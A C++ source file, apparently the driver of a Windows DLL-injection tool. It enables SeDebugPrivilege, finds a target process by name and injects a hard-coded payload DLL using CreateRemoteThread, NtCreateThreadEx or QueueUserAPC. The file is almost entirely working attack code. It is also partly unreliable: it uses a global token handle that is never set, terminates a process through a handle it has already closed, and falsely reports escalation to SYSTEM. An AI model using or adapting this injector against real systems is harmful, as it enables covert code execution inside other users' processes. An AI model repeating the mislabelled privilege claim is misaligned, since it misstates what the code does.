#include "Injector.h"

#ifdef _WIN64
	LPCSTR DllPath = "C:\\Users\\kourosh\\source\\repos\\WindowsDLLInjector\\PayloadDLLBuild\\bin\\x64\\Debug\\PayloadDLL.dll";
#else
	LPCSTR DllPath = "C:\\Users\\kourosh\\source\\repos\\WindowsDLLInjector\\PayloadDLLBuild\\bin\\Win32\\Debug\\PayloadDLL.dll";
#endif
// variables for Privilege Escalation
HANDLE hToken;
int dwRetVal = RTN_OK;

int main() {

	if (!GetOSInfo()) {
		printf("Failed to get Windows NT version\n");
		printf("LastError: 0x%x\n", GetLastError());
	}
	
	printf("escalating Privileges...\n");
	Sleep(2000);
	int epResult = EscalatePrivilege();
	printf("Result of Privilege Escalation : %d\n", epResult);

	if (epResult == RTN_OK)
		printf("Successfully Escalated privileges to SYSTEM level...\n");
	
	char szProc[80];

	printf("Target process name : ");
	scanf_s("%79s", szProc, 79);

	PROCESSENTRY32 PE32{ sizeof(PROCESSENTRY32) };
	PE32.dwSize = sizeof(PE32);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed!");
		printf("LastError : 0x%x\n", GetLastError());
		system("PAUSE");
		return 0;
	}

	DWORD PID = 0;
	BOOL bRet = Process32First(hSnap, &PE32);

	while (bRet) {

		//printf("process: %s\n", PE32.szExeFile);
		if (!strcmp((LPCSTR)szProc, PE32.szExeFile)) {
			PID = PE32.th32ProcessID;
			break;
		}
		bRet = Process32Next(hSnap, &PE32);
	}

	CloseHandle(hSnap);

	printf("Target Program PID: %d\n", PID);
	Sleep(2000);
	system("PAUSE");

	int InjectionMethod = -1;

	printf("\n");
	printf("   1) CreateRemoteThread\n");
	printf("   2) NtCreateThread\n");
	printf("   3) QueueUserAPC\n");
	printf("\n");
	printf("Enter the Injection method: ");
	scanf("%d", &InjectionMethod);

	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, PID);	

	//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (!hProcess) {
		printf("Could not open Process for PID %d\n", PID);
		printf("LastError : 0X%x\n", GetLastError());
		system("PAUSE");
		return false;
	}
	
	// disable SeDebugPrivilege
	SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);

	// close handles
	CloseHandle(hToken);

	switch (InjectionMethod)
	{
		case 1:
			CreateRemoteThread_Type1(DllPath, hProcess);
			break;
		case 2:
			NtCreateThreadEx_Type2(DllPath, hProcess);
			break;
		case 3:
			QueueUserAPC_Type3(DllPath, hProcess, PID);
	}
	

	CloseHandle(hProcess);

	if (!TerminateProcess(hProcess, 0xffffffff))
	{
		DisplayError("TerminateProcess");
		dwRetVal = RTN_ERROR;
	}

	return 0;
}


bool SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege){

	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return false;

	// First pass. get current privilege settings
	tp.PrivilegeCount				= 1;
	tp.Privileges[0].Luid			= luid;
	tp.Privileges[0].Attributes		= 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious);

	if (GetLastError() != ERROR_SUCCESS) return false;	

	// second pass. set privileges based on previous settings

	tpPrevious.PrivilegeCount		= 1;
	tpPrevious.Privileges[0].Luid	= luid;

	if (bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
	);


	if (GetLastError() != ERROR_SUCCESS) return false;

	return true;
}
/*	
BOOL SetPrivilege(
	HANDLE hToken,  // token handle 
	LPCTSTR Privilege,  // Privilege to enable/disable 
	BOOL bEnablePrivilege  // TRUE to enable. FALSE to disable 
)
{
	TOKEN_PRIVILEGES tp = { 0 };
	// Initialize everything to zero 
	LUID luid;
	DWORD cb = sizeof(TOKEN_PRIVILEGES);
	if (!LookupPrivilegeValue(NULL, Privilege, &luid))
		return FALSE;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}
	AdjustTokenPrivileges(hToken, FALSE, &tp, cb, NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}
*/

void DisplayError(LPCSTR szAPI) {

	LPTSTR MessageBuffer;
	DWORD dwBufferLength;

	fprintf(stderr, "%s() error!\n", szAPI);

	if (dwBufferLength = FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		GetLastError(),
		GetSystemDefaultLangID(),
		(LPTSTR)&MessageBuffer,
		0,
		NULL
	)) {

		DWORD dwBytesWritten;

		// Output message string on stterr
		WriteFile(
			GetStdHandle(STD_ERROR_HANDLE),
			MessageBuffer,
			dwBufferLength,
			&dwBytesWritten,
			NULL
		);

		// Free the buffer alllocated by the system
		LocalFree(MessageBuffer);
	}

}

int EscalatePrivilege() {

	HANDLE hToken;
	int dwRetVal = RTN_OK;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {

		if (GetLastError() == ERROR_NO_TOKEN) {
			if (!ImpersonateSelf(SecurityImpersonation)) return RTN_ERROR;

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)){
				DisplayError("OpenThreadToken");
				return RTN_ERROR;
			}
			
		}
		else {
			return RTN_ERROR;
		}
	}

	// Enable SetPrivilege()

	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {

		DisplayError("Set Privilege");

		//close token handle
		CloseHandle(hToken);

		//indicate failure
		return RTN_ERROR;
	}

	return dwRetVal;
}